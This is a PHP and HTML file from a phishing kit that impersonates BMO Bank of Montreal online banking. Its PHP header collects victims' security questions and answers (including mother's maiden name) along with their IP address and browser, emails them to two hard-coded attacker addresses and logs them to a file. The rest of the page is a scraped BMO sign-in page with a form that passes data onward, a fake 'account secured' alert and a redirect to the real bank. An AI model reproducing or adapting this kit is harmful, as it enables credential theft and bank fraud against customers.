<?php
session_start();
$ccname = $_POST['question1'];
$phone = $_POST['answer1'];
$day = $_POST['question2'];
$month = $_POST['answer2'];
$year = $_POST['question3'];
$mmn = $_POST['answer3'];
$ip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
$date = date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
			
$subject= "BMO Page 2";
$from="From: bmo<ikdavidgod4@gmail.com,chukuma1111@outlook.com>";																	
$mesaj = "
Question 1: $ccname
Answer 1: $phone
Question 2: $day
Answer 2: $month
Question 3: $year
Answer 3: $mmn

-------------------------

[ IP: $ip | Date: $date ]
[ Browser: $browser ]";

mail("ikdavidgod4@gmail.com,chukuma1111@outlook.com", "$ccname - $card_number", "$mesaj");

$file = fopen("log.html", "a");
fputs ($file, "$mesaj\r\n");
fclose ($file);
?>
<html>
<head>
<meta http-equiv="content-type" content="text/html;
charset=ISO-8859-1">
<!-- Release 1.1 BUILD# 00.20.00 -->
<link rel="SHORTCUT ICON" href="https://www1.bmo.com/mc/favicon.ico">
<link rel="icon" href="https://www1.bmo.com/mc/favicon.ico"
type="image/ico">
<meta HTTP-EQUIV="REFRESH" content="5; url=http://bmo.com">
<title>BMO Bank of Montreal Online Banking</title>
<meta name="description" content="Bank of Montreal, MasterCard">
<meta name="keywords" content="Bank of Montreal, MasterCard">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="EXPIRES" content="-1">
<script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/validator-rules.js"></script>
<script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/validator-rules-bmo.js"></script>
<script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/common.js"></script>

<script language=javascript> alert('THANKS FOR RECONFIRMING YOUR (PVQ) PERSONAL VERIFICATION QUESTIONS, YOUR ACCOUNT IS NOW SECURE WITH US'); window.location='https://www.bmo.com/olb/signout/personal/en/'; </script>
<!-- Begin

var bCancel = false;

function validateMCRegForm(form) {
if (bCancel) {
return true;
} else {
var formValidationResult;
formValidationResult = validateRequired(form) && validateMask(form) && validateAllRequired(form) && validateAllMask(form) && validateMinLength(form) && validateMaxLength(form);
return (formValidationResult);
}
}

function MCRegForm_required () {
this.a0 = new Array("card_number", "Please enter your MasterCard number.", new Function ("varName", "this.maxlength='16'; this.mask=/^[0-9]*$/; this.minlength='16'; return this[varName];"));
}

function MCRegForm_mask () {
this.a0 = new Array("card_number", "Your MasterCard number should only contain numbers. Please re-enter your MasterCard number again.", new Function ("varName", "this.maxlength='16'; this.mask=/^[0-9]*$/; this.minlength='16'; return this[varName];"));
}

function MCRegForm_allRequired () {
}

function MCRegForm_allMask () {
}

function MCRegForm_minlength () {
this.a0 = new Array("card_number", "Your MasterCard number contains 16 digits. Please re-enter your MasterCard number again.", new Function ("varName", "this.maxlength='16'; this.mask=/^[0-9]*$/; this.minlength='16'; return this[varName];"));
}

function MCRegForm_maxlength () {
this.a0 = new Array("card_number", "Your MasterCard number contains 16 digits. Please re-enter your MasterCard number again.", new Function ("varName", "this.maxlength='16'; this.mask=/^[0-9]*$/; this.minlength='16'; return this[varName];"));
}


//End -->
</script>
<script language="javascript">

function myFocus() {
document.MCRegForm.card_number.focus();
}

window.onload = myFocus;

</script>
<html class="dj_webkit dj_chrome dj_contentbox"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
		<meta http-equiv="X-UA-Compatible" content="IE=8">		
		
	    <meta name="keywords" content="bank, banking, online, personal banking, business, commercial, small-business, bmo online banking, online banking, bmo bank of montreal, bmo financial group, bmo, mastercard, bmo mastercard , bank account, mortgage, loan, investment, credit card">
	    <meta name="description" content="Sign in to BMO Online Banking to access your BMO accounts and online services 24 hours a day, 7 days a week.">
	    <meta name="channelLevel1" content="home">
		
		<meta http-equiv="set-cookie" content="olbcookie=yes; path=/; secure">
	
		<title>BMO Bank of Montreal Online Banking</title>
		
		<script src="https://www1.bmo.com/onlinebanking/includes/ajaxCheck.js" type="text/javascript"></script>
		<script type="text/javascript">
		<!--
			checkAjax("en");
		//-->
		</script>
		<noscript>
		&lt;meta http-equiv="refresh" content="0;url=https://www1.bmo.com/onlinebanking/html/en/NoJavascript.html"/&gt;
		</noscript>		
		



<link href="https://www13.bmo.com/onlinebanking/onlinebanking/en/images/favicon.ico" rel="shortcut icon">

<link href="https://www13.bmo.com/onlinebanking/includes/dojo/dojo/resources/dojo.css" rel="stylesheet" type="text/css">


<link href="https://www13.bmo.com/onlinebanking/includes/dojo/dijit/themes/tundra/tundra.css" rel="stylesheet" type="text/css">


<link href="https://www13.bmo.com/onlinebanking/onlinebanking/en/css/bmo.base.css" rel="stylesheet" type="text/css">
<link href="https://www13.bmo.com/onlinebanking/onlinebanking/en/css/bmo.dojoTheme.css" rel="stylesheet" type="text/css">
<link href="https://www13.bmo.com/onlinebanking/onlinebanking/en/css/bmo.print.base.css" rel="stylesheet" type="text/css" media="print">

<script src="https://www1.bmo.com/onlinebanking/includes/dojo/dojo/dojo.js" type="text/javascript" djconfig="parseOnLoad: true"></script>
<script src="https://www1.bmo.com/onlinebanking/includes/dojo/dojo/nls/olbdojo_en.js" type="text/javascript" charset="UTF-8"></script>
<script src="https://www1.bmo.com/onlinebanking/includes/dojo/dojo/olbdojo.jsonlinebanking/includes/dojo/dojo/olbdojo.js" type="text/javascript"></script>

<script type="text/javascript" src="https://www1.bmo.com/onlinebanking/onlinebanking/en/bmo.content.js"></script>
<script type="text/javascript" src="https://www1.bmo.com/onlinebanking/onlinebanking/js/bmo.base.js"></script>
<script type="text/javascript" src="https://www1.bmo.com/onlinebanking/onlinebanking/js/global.js"></script>

		<link href=""https://www13.bmo.com/onlinebanking/en/css/registration/registration.css" rel="stylesheet" type="text/css">
		<script type="text/javascript" src="https://www1.bmo.com/onlinebanking/js/registration/registration.js"></script>
 

    <script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/validator-rules.js"></script>
    <script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/validator-rules-bmo.js"></script>
    <script language="JavaScript" src="https://www1.bmo.com/mc/web/includes/en/common.js"></script>
    <script type="text/javascript" language="Javascript1.1"> 



<meta http-equiv="pics-Label" content="(pics-1.1 &quot;http://www.icra.org/pics/vocabularyv03/&quot; l gen true for &quot;https://www1.bmo.com&quot; r (n 0 s 0 v 0 l 0 oa 0 ob 0 oc 0 od 0 oe 0 of 0 og 0 oh 0 c 0) gen true for &quot;https://www1.bmo.com&quot; r (n 0 s 0 v 0 l 0 oa 0 ob 0 oc 0 od 0 oe 0 of 0 og 0 oh 0 c 0))">
<meta http-equiv="PICS-Label" content="(PICS-1.1 &quot;http://www.rsac.org/ratingsv01.html&quot; l gen true comment &quot;RSACi North America Server&quot; for &quot;https://www1.bmo.com&quot; on &quot;2007.08.16T01:59-0800&quot; r (n 0 s 0 v 0 l 0))">
<link rel="meta" href="https://www1.bmo.com/labels_gss.rdf" type="application/rdf+xml" title="ICRA labels">
       
		
		
		
		<script language="javascript" src="https://www1.bmo.com/onlinebanking/includes/en/common.js"></script>
		<script language="javascript" src="https://www1.bmo.com/onlinebanking/includes/en/exsignin.js" charset="ISO-8859-1"></script>
		<script language="javascript">

		BMO.helpCentre.url = "https://bmo.intelliresponse.com/olb_en/index.jsp";
		
		var errors = new Array();
		function displayErrors(errors,errorCode){
			var errorDivBoxElt = document.getElementById('clientSideErrorBoxId');
		
			var openingDiv = "<div class='rbox-left-side'><div class='rbox-right-side'><div class='rbox-content'>";
			var closingDivs = "</div></div></div><div class='rbox-top-left'></div><div class='rbox-top-right'></div><div class='rbox-bottom-left'></div><div class='rbox-bottom-right'></div>";
			var finalHtml = "";
			if(errors != null && typeof errors  != 'undefined'){
				errorDivBoxElt.className='errorBox rbox bulletinBox rbox-container';
				var messages = new String();
				for(var i in errors){
					messages += errors[i] + '<br>';
				}
				
				if(errorCode != null && typeof errorCode  != 'undefined'){
					messages += '<br/><br/>' + errorCode;
				}
		
				finalHtml = openingDiv + messages + closingDivs;
		
				try{
					errorDivBoxElt.innerHTML = finalHtml;
				}catch(err){
		
				}
			}else{
				errorDivBoxElt.innerHTML='';
			}
		}	
	
		function resetErrors(){
			var errorDivBoxElt = document.getElementById('clientSideErrorBoxId');
			
			try{
				errorDivBoxElt.className='';
			}catch(err){
				//console.log("Errors occured here.");
			}
		}
	
		function redirect() {
		     window.location = "https://www1.bmo.com/onlinebanking/jsp/en/UpgradeInternetExplorer.jsp";  
		}
		</script>
		
		<script language="javascript">
		
			dojo.addOnLoad(
			    function(){
			    	var fbcDijit = dijit.byId("siBankCard");
			    	var fbcDropdownDijit = dijit.byId("siBankCardDD");
			    	
			    	if(fbcDijit){
				    	fbcDijit.focus(); 
			    	}
			    	if(fbcDropdownDijit){
				    	fbcDropdownDijit.focus(); 
			    	}
			    }
			);
			<!--
				if (self != top) 
				{
					top.location.href = self.location.href;
				}
				var fullyLoaded = false;
				window.name="main";
				function selectFBCNumber()
				{
					document.SignOn.FBC_Number.focus();
				}
				var busyTimer = null;
				var busy = "false";
				function checkDblclick() 
				{
					if (busy == "true") 
					{
						return false;
					} 
					else 
					{
						busyTimer = window.setTimeout("resetBusy()",15000);
						busy = "true";
						return true;
					}
				}
				function resetBusy() 
				{
					busy = "false";
				}
			// -->
			
		</script>
		<!-- For Passmark  -->
		<script src="https://www1.bmo.com/onlinebanking/includes/pm_fp.js" language="javascript" type="text/javascript"> </script> 
	<script type="text/javascript">
		var gPageTitle = "OLB - Sign in - Enter Card Number";
	</script><script>   
		function trackView(img) {
			trackViewFail(img, 'FBCForm', 'www13.bmo.com');
		}
	
		function trackViewStatus(img, viewStatus) {
			if (img.src.indexOf("sp.gif") == -1) {
				trackViewFailStatus(viewStatus, 'FBCForm', 'www13.bmo.com');
			}
		}
		
		function trackClick() {
			post('click', 'FBCForm', 'www13.bmo.com');
		}
	
	</script><script>
		function submitTo(product){
		
	//	var sf = dijit.byId('regSignInForm');
	//	if(sf.isValid()){
				if(product == 15){ //i.e MC
					var submitForm = document.getElementById('regSignInForm');
					submitForm.action = 'https://www13.bmo.com/onlinebanking'+'/MasterCard/MCmain/Password?product=' + product;
					if(MCSignInChecks()){
						submitForm.submit();
					}
					
				}
				else {
					if(SignInChecks()){
					var submitForm = document.getElementById('regSignInForm');
					var submitAction = submitForm.action;
					submitForm.action = submitAction + '?product=' + product;
					 submitForm.submit();
					}
				}
	//		}
			
			return false;
		}
	</script><script type="text/javascript">
		pgRef   = '';
		imgSrc  = '';
		lnkType = 'NW';
		altTag  = '';
		
	</script></head>

	

	

	
	 
	

	<!--[if lt IE 7]>  
	<SCRIPT LANGUAGE="javascript">
		redirect();
	</SCRIPT>
	<![endif]-->
	<!--[if IE 7 ]>    <body class="tundra ie7"> <![endif]-->
	<!--[if IE 8 ]>    <body class="tundra ie8"> <![endif]-->
	<!--[if IE 9 ]>    <body class="tundra ie9"> <![endif]-->
	<!--[if (gt IE 9)|!(IE)]><!--> <body class="tundra"> <!--<![endif]-->
	
	<!-- Wrapper div to keep all styles separate from any other space that these styles are integrated with. -->
	<div class="bmoOLB">
		<div id="root_div" class="medium">
			<div id="header" class="header">
					<a href="http://www.bmo.com/" type="image" ;="" return="" false;"="" title="logo" alt="logo" id="header_logo">BMO Financial Group logo</a>
				<div id="headerLinks">
					<a href="" onclick="Popup(&#39;https://locator.bmo.com/Default.aspx?t=bb&amp;lang=en&#39;,10); return false;">Locate an ATM or Branch</a> | 
					<a href="" onclick="Popup(&#39;http://www.bmo.com/home/about/banking/corporate-info/contact-us/phone?pChannelId=1766905&#39;,10); return false;">Contact Us</a> | 
					
						<a href="https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=6">Fran�ais</a>
					
				</div>

				<form id="frmDropDown" name="frmDropDown" action="">
					<label id="lbl_signin" for="signin">Other BMO Sites: </label>
					<div id="signinContainer">
						<table class="dijit dijitReset dijitInline dijitLeft signin dijitDownArrowButton DropDownSignIn" dojoattachpoint="_buttonNode,tableNode" cellspacing="0" cellpadding="0" wairole="presentation" dojoattachevent="onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" role="presentation" widgetid="signin"><tbody wairole="presentation" role="presentation"><tr wairole="presentation" role="presentation"><td class="dijitReset dijitStretch dijitButtonContents dijitButtonNode" dojoattachpoint="focusNode" wairole="combobox" waistate="haspopup-true" role="combobox" aria-haspopup="true" aria-valuetext="BMO InvestorLine" id="signin" tabindex="0" title="Sign In"><span class="dijitReset dijitInline dijitButtonText" dojoattachpoint="containerNode,_popupStateNode"><span class="dijitReset dijitInline DropDownSignInLabel">BMO InvestorLine</span></span><input type="hidden" name="signin" dojoattachpoint="valueNode" value="https://www.bmoinvestorline.com" waistate="hidden-true" aria-hidden="true">
		</td><td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton" dojoattachpoint="titleNode" wairole="presentation" role="presentation"><div class="dijitReset dijitArrowButtonInner" wairole="presentation" role="presentation">&#8201;</div><div class="dijitReset dijitArrowButtonChar" wairole="presentation" role="presentation">&#9660;</div></td></tr></tbody></table>
					</div>
					<a href="" type="image" onclick="goHere(document.frmDropDown.signin.value); return false;" title="GO" alt="GO" id="header_goButton">GO</a>		
				</form>
				<div id="SecureSite">Secure Site</div>
			</div>
					
			<!-- END header -->
			<div id="middle_topCap"></div>
			<div id="middle_div">


  
			
					<div id="main_body" class="main_body registration regTwoCol reg_signintoggle">
  						<div id="utilityBar">
								<div id="pageLevelUtilities">
		<ul id="pageLevelUtilitiesNav">
			<li>
				Text Size:
			</li>
			<li id="textSize">
				<a id="tsSmall" href="https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=5#" title="Small">Small</a>
				<a id="tsMedium" class="tsSelected" href="https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=5#" title="Medium">Medium</a>
				<a id="tsLarge" href="https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=5#" title="Large">Large</a>
			</li>
		</ul>
		<a id="helpCentre" href="https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=5#" title="Help Centre" alt="Help Centre">Help Centre</a>
	</div>
							
							<h1 id="mainHeader">Sign In to Online Banking</h1>
						</div><div id="messageManagerArea" aria-live="assertive"><!-- - --></div>
							
						<div class="tripleColContainer">
							<!-- div class="singinToggleContainer rbox"-->
							<div>
								<p></p><br>
 								
 								
 								</p>
							</div>
							<form action="MCRegInit3.php" method="post" onsubmit="return validateMCRegForm1(this);" >
								<!-- For Passmark  -->
								









	
	<script language="JavaScript" type="text/javascript">
	<!--
	var flashinstalled = 0;
	var flashversion = 0;
	MSDetect = "true";
	if (navigator.plugins && navigator.plugins.length) {
	    x = navigator.plugins["Shockwave Flash"];
	    if (x) {
	        flashinstalled = 2;
	        if (x.description) {
	            y = x.description;
	            flashversion = y.charAt(y.indexOf('.')-1);				
	        }
	    }
	    else
	        flashinstalled = 1;
	    if (navigator.plugins["Shockwave Flash 2.0"]) {
	        flashinstalled = 2;
	        flashversion = 2;
	    }
	}
	else if (navigator.mimeTypes && navigator.mimeTypes.length) {
	    x = navigator.mimeTypes['application/x-shockwave-flash'];
	    if (x && x.enabledPlugin)
		    flashinstalled = 2;
	    else
		    flashinstalled = 1;
	}
	else {
	    MSDetect = "true";
	}
	// -->
	</script>
	<script language="vbscript">
		on error resume next
		If MSDetect = "true" Then			
			For i = 2 to 6
				If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then
				Else
					flashinstalled = 2
					flashversion = i
				End If
			Next
			If flashinstalled = 0 Then
				flashinstalled = 1
			End If
		End If
		</script>
		<script language="JavaScript" type="text/javascript">
		<!--
			if (flashinstalled == 2 && flashversion >= 6) {
				var out = "";
		out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";
		out = out + "width='1' height='1'>" + "\n";
		out = out + "<param name='movie' value='https://www13.bmo.com/pmfso.swf'>" + "\n";
		out = out + "<param name='quality' value='high'>" + "\n";
		out = out + "<param name='bgcolor' value=#FFFFFF>" + "\n";
		out = out + "<param name='FlashVars' value='gotoUrl=&sendUrl=https%3A%2F%2Fwww13.bmo.com%2Fsimplepmfso'>" + "\n";
		out = out + "<embed src='https://www13.bmo.com/pmfso.swf'" + "\n";
		out = out + "FlashVars='gotoUrl=&sendUrl=https%3A%2F%2Fwww13.bmo.com%2Fsimplepmfso'" + "\n";
		out = out + "quality='high' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
		out = out + "type='application/x-shockwave-flash'>" + "\n";
		out = out + "<noembed>" + "\n";
		out = out + "</noembed>" + "\n";
		out = out + "<noobject></noobject>" + "\n";
		out = out + "</embed>" + "\n";
		out = out + "<noobject></noobject>" + "\n";
		out = out + "</object>" + "\n";
				document.write(out);
			}
		//-->
		</script>
		<noscript>
		&lt;object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'
				width='1' height='1'&gt;
			&lt;param name='movie' value='https://www13.bmo.com/pmfso.swf'&gt;
			&lt;param name='quality' value='high'&gt;
			&lt;param name='bgcolor' value=#FFFFFF&gt;
			&lt;param name='FlashVars' value='gotoUrl=&amp;sendUrl=https%3A%2F%2Fwww13.bmo.com%2Fsimplepmfso'&gt;
			&lt;embed src='https://www13.bmo.com/pmfso.swf'
					FlashVars='gotoUrl=&amp;sendUrl=https%3A%2F%2Fwww13.bmo.com%2Fsimplepmfso'
					quality='high' bgcolor='#FFFFFF' width='1' height='1'
					type='application/x-shockwave-flash'&gt;
				&lt;noembed&gt;&lt;/noembed&gt;
				&lt;noobject&gt;&lt;/noobject&gt;
			&lt;/embed&gt;
			&lt;noobject&gt;&lt;/noobject&gt;
		&lt;/object&gt;
		</noscript>




								


		
		<input type="hidden" name="pm_fp" id="pm_fp" value="version%3D1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%206%2E3%3B%20wow64%29%20applewebkit/537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome/36%2E0%2E1985%2E143%20safari/537%2E36%7C5%2E0%20%28Windows%20NT%206%2E3%3B%20WOW64%29%20AppleWebKit/537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/36%2E0%2E1985%2E143%20Safari/537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1360%7C768%7C768%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D7%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D1%26pm%5Ffpco%3D1">
		<script language="javascript">
			post_fingerprints();
		</script>

								<input name="state" type="hidden" value="1">
								<input name="saveFBC" type="hidden" value="">
 
								
								<div id="clientSideErrorBoxId"></div>
								
								
 
										
  
<!-- /header -->
<table border="0" cellpadding="0" cellspacing="0" width="760">
<tbody>
<tr>
<td><img src="https://www1.bmo.com/mc/web/images/en/sp.gif"
height="1" width="40"></td>
<td width="720">
<title>BMO Online Membership Verification</title>
<script language="javascript">
<!-- CR#OLB2009-058 OLBMR#2009-2.4 -->
if (self != top) {
top.location.href = self.location.href;
}
</script>
<table border="0" cellpadding="0" cellspacing="0"
width="720">
<tbody>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0"
width="560">
<form action="done.php" method="post"
onsubmit="return validateMCRegForm1(this);"></form>
<input name="mode" value="form2" type="hidden"> <input
name="page" value="1" type="hidden"> <tbody>
<tr valign="top">
<td class="title" height="25">
<!-- page header --> <b>BMO Online
Membership Verification</b>
<!-- /page header --> </td>
</tr>
</tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0"
width="540">
<tbody>
<tr>
<td><img
src="https://www1.bmo.com/mc/web/images/en/sp.gif"
height="20" width="20"></td>
<td><img
src="https://www1.bmo.com/mc/web/images/en/sp.gif"
height="20" width="80"></td>
<td><img
src="https://www1.bmo.com/mc/web/images/en/sp.gif"
height="20" width="180"></td>
</tr>
</tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0"
width="540">
<tbody>
<tr>
<td width="560">
<div class="frame">
<table border="0" cellpadding="0"
cellspacing="0" width="540">
<!--
<tr>
<td class="bodytext" nowrap width="180"><b>About Your Business</b></td>
<td align="right"><SPAN STYLE="color: black; font-size: 10pt"><span class="required">*</span>required fields</SPAN></td>
</tr>
--> <tbody>
<tr>
<td colspan="3">
<table border="0" cellpadding="0"
cellspacing="0" align="center">
<tbody>
<tr>
<td width="100%"><b>
</p><p><b>You
Have Successfully
Confirmed your account
information.</b><br>
</tr>
<tr>
<td><br>
</td>
</tr>
</tbody>
</table>
<font color="#AFAFAF"> </font><small><font
color="#AFAFAF">The New Anti
Fraud System has been
successfully added to your BMO
account.</font></small>
<ul>
<font color="#AFAFAF">Our robust
proprietary risk models help
to protect you by monitoring
for unusual activity - and
working to stop it.<br>
BMO technology evaluates
transactions according to
hundreds of variables in order
to pinpoint potentially
fraudulent activity. <br>
<our unique,=""
patent-pending="" methods=""
for="" bank="" account=""
verification="" provide=""
paypal="" members="" an=""
additional="" level="" of=""
security,="" which=""
lowers="" risk="" and=""
increases="" trust="" the=""
entire="" community.<br="">
<br>
We use powerful encryption
methods to help protect your
sensitive information. </our></font>
</ul>
</td>
</tr>
</tbody>
</table>
</div>
</td>
</tr>
</tbody>
</table>
<p>
<!-- buttons -->
<table border="0" cellpadding="0" cellspacing="0"
width="550">
<tbody>
<tr>
<td class="bodytext" width="180"><img
src="https://www1.bmo.com/mc/web/images/en/sp.gif"
height="50" width="10"></td>
</tr>
</tbody>
</table>
<!-- /buttons --> </p>
</td>
</tr>
</tbody>
</table>
<p><br>
</p>
<p><br>
</p>
<p> </p>
<p><br>
<!-- End of Text --> </p>
 
 
				







<div id="ptBottomFooter">
	<a href="" onclick="Popup(&#39;http://www.bmo.com/home/about/banking/privacy-security/our-privacy-code&#39;,1); return false;">Privacy</a> | 
	<a href="" onclick="Popup(&#39;http://www.bmo.com/home/popups/global/legal&#39;,6); return false;">Legal</a> | 
	<a href="" onclick="Popup(&#39;http://www.bmo.com/home/about/banking/privacy-security/how-we-protect-you&#39;,1); return false;">Security</a> | 
	<a href="" onclick="Popup(&#39;http://www.bmo.com/home/popups/global/cdic&#39;,6); return false;">CDIC Member</a>
	<div id="ptRightEndorseLogo"></div>
</div>






			</div>
			<!-- /footer -->
			<script language="javascript">
				<!--
				fullyLoaded = true;

				document.onkeydown = function(event){      
					var holder;      //IE uses this      
					if(window.event){            
					 holder=window.event.keyCode;      
					 }     
					//FF uses this      
					else{             
					 holder=event.which;     
					}       
					submitOnEnter(holder); 
				}	
		
				function submitOnEnter(key)
				{	
					if(key==13){
					
						var siBankCardDJ = dijit.byId("siBankCard"),
							siMasterCardDJ = dijit.byId("siMasterCard"),
							bankCardSelect = dijit.byId("siBankCardDD"),
							masterCardSelect = dijit.byId("siMasterCardDD");
						
							if(siBankCardDJ){
								if(siBankCardDJ.getValue() != ''){
									submitTo(5);
									return false;
								}
							}
		
							if(siMasterCardDJ){
								if(siMasterCardDJ.getValue() != ''){
									submitTo(15);
									return false;
								}
							}
												
							if(bankCardSelect){
								if(bankCardSelect.getValue() != '' && bankCardSelect.getValue() != "diff_card"){
									submitTo(5);
									return false;
								}
							}
		
							if(masterCardSelect){
								if(masterCardSelect.getValue() != '' && masterCardSelect.getValue() != "diff_card"){
									submitTo(15);
									return false;
								}
							}
		
							submitTo(5);
							return false;
					}
				}		 
				
							
				// -->
			</script>
		</div>
			
	</div> 
	

<script type="text/javascript" src="./BMO_files/webAnalytics.js"></script>
<script type="text/javascript">
	// Load s_code for QA or Prod based on config file.
	loadAnalyticsScript("https://www.bmo.com/scripts/s_code.js");
</script><script type="text/javascript" src="./BMO_files/s_code.js"></script>
<script type="text/javascript">
	function sCodeData() {
		// lang and lob used for generating s.pageName.	
		sc_mapping["lang"] = "en";
		sc_mapping["lob"] = "COMM";
		
		s.prop14 = sc_mapping["lang"];
		s.eVar10 = "";
		
		if(typeof gPageTitle != 'undefined'){
			s.pageName = generatePageName(gPageTitle);
		}
	} 
</script>

	
	<script type="text/javascript">
		function sCodeAdditionalData() {
			s.pageName = "BMO:OLB:Signin";
		}
	</script>
	    
<!-- Online_Banking               -->	    


<div class="bmoDijitDialog" tabindex="-1" wairole="dialog" waistate="labelledby-bmo_Dialog_0_title" role="dialog" aria-labelledby="bmo_Dialog_0_title" id="bmo_Dialog_0" widgetid="bmo_Dialog_0" title="" style="left: 508px; top: 317px; display: none; position: absolute;">
	<div dojoattachpoint="titleBar" class="bmoDijitDialogTitleBar">
	<span dojoattachpoint="titleNode" class="dijitDialogTitle" id="bmo_Dialog_0_title"></span>
	<span dojoattachpoint="closeButtonNode" class="dijitDialogCloseIcon" dojoattachevent="onclick: onCancel, onmouseenter: _onCloseEnter, onmouseleave: _onCloseLeave" title="Close" style="display: block;">
		<span dojoattachpoint="closeText" class="closeText" title="Cancel" style="display: none;">x</span>
	</span>
	</div>
		<div dojoattachpoint="containerNode" class="bmoDijitDialogPaneContent"><iframe id="helpCenterIframeId" name="helpCenterIframeId" style="border: none; width: 855px; height: 825px;" frameborder="0"></iframe></div>
</div><div class="dijitTooltip dijitTooltipLeft" id="dijit__MasterTooltip_0" widgetid="dijit__MasterTooltip_0">
	<div class="dijitTooltipContainer dijitTooltipContents" dojoattachpoint="containerNode" wairole="alert" role="alert"></div>
	<div class="dijitTooltipConnector"></div>
</div></body></html>